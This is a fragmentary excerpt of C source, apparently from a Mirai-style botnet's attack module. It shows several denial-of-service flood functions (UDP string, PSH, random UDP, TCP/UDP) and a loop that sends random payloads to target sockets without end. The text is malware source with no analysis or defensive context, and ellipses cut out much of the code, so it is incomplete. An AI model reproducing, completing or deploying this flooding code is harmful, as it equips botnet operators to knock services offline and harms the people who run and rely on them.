...
void attack_method_udpstr(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, b;
    char **pkts = calloc(targs_len, sizeof (char *));
...
void attack_method_psh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
...
void attack_method_udprand(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    ...
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            ...
            if (data_rand)
                rand_alpha_str(data, data_len);
            send(fds[i], data, 1458, MSG_NOSIGNAL);
        }
    }
}
...
void attack_method_tcpudp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
